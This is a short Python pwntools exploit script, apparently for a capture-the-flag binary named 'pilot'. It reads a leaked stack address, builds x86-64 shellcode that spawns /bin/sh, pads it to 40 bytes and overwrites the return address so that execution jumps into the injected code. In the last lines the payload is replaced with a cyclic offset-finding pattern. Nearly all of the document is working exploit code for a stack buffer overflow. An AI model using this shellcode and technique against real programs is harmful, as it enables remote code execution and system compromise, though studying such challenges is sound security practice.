#!/usr/bin/python3
import pwn
# run straight
e = pwn.context.binary = pwn.ELF("./pilot")
p = e.debug(gdbscript="source /home/nick/global/halfdisp.py"
    +"\nbreak *0x400ae0"
    +"\nc"
)
#p = pwn.process("./pilot")
p.recvuntil("[*]Location:")

leak = p.recvline()

inputAdr = int(leak.strip(b"\n"), 16)
payload = b"\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05" 

# Padding to the return address
payload += b"0"*(40 - len(payload))

# Overwrite the return address with the address of the start of our input
payload += pwn.p64(inputAdr)


# Send the payload, drop to an interactive shell to use the shell we pop
payload=b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A"
p.send(payload)


